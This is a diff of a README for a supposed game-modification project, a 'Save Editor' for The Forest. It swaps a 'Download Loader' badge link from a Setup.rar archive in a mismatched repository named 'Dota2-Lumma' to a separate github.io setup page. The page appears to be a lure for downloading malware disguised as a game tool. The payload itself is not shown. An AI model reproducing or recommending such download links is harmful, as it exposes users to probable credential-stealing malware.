@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for The Forest Save Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `The-Forest-Save-Editor` · Updated: 2026-10-24
 
 **Tags:** `the-forest` `save-editor` `survival` `horror` `steam`
+
 
 
 
